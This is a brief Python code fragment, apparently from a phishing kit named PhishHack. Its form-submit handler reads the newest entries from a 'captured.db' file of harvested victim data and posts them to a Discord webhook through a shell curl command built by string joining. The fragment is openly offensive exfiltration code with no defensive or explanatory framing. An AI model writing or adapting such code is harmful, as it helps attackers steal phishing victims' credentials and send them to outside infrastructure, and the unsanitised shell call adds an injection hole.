try:
    ...
    def submit():
        if request.method == "POST":
            ...
            os.system("curl -H 'Content-Type: application/json' -d '{\"content\": \"" + os.popen('cat /root/PhishHack/captured.db | tail -n2').read().strip() + "\"}' https://discord.com/api/webhooks/1234567890/abcde")
